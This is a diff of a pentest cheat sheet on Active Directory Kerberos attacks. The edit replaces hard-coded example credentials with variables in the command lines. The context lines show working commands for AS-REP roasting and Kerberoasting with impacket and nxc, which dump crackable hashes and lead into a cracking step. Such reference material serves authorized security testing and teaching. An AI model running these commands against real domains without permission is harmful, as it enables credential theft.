@@ -71,7 +71,7 @@ You have any valid domain credential. This lets you ask LDAP _which_ accounts ar
 GetNPUsers.py '$DOMAIN/user:Password123' -request -dc-ip $DC_IP -format hashcat -outputfile as-rep.txt
 
 # nxc
-nxc ldap $DC_IP -u user -p 'Password123' --asreproast as-rep.txt
+nxc ldap $DC_IP -u $USER -p '$PASS' --asreproast as-rep.txt
 ```
 
 ## <span style="color:#8BE9FD">With BloodHound</span>
@@ -125,7 +125,7 @@ GetUserSPNs.py -no-preauth "asrep_user" -usersfile spn_targets.txt \
 
 ### <span style="color:#50FA7B">Method 2 — nxc</span>
 ```bash
-nxc ldap dc.$DOMAIN -u asrep_user -p '' --kerberoasting roasted.txt
+nxc ldap dc.$DOMAIN -u $USER -p '' --kerberoasting roasted.txt
 ```
 
 ### <span style="color:#50FA7B">Then crack</span>
